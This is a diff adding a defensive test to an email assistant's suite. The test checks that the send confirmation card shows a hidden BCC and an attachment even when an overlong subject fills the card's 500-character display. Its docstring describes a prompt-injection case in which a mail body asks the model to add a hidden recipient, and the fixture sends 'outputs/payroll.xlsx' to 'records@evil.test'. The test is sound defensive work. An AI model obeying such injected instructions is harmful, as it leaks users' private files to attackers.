@@ -618,3 +618,23 @@ async def test_no_mailbox_connected_changes_nothing(
     out = await getattr(agents, tool)(**kwargs)
     assert out == "Nothing changed. No email accounts are connected."
     assert gw.writes == [] and gw.cards == []
+
+
+# ── email-chat-send-card-shows-hidden (review round 1) ───────────────────────
+
+async def test_the_send_card_shows_each_bcc_and_each_file_before_a_long_subject(
+    gw: Gateway,
+) -> None:
+    """A mail body can ask the model to add a hidden recipient or a file. The
+    card shows both, even when a long subject from the sender of the mail fills
+    the 500 characters that the card keeps."""
+    gw.accounts = TWO[:1]
+    await agents.send_email(
+        body="Hi", to=["kim@contoso.test"], subject="S" * 600,
+        bcc=["records@evil.test"], attachments=["outputs/payroll.xlsx"],
+    )
+    [card] = gw.cards
+    shown = str(card["detail"]).strip()[:500]  # the cut of ask_tools.py
+    assert "records@evil.test" in shown
+    assert "outputs/payroll.xlsx" in shown
+    assert shown.index("payroll.xlsx") < shown.index("Subject:")
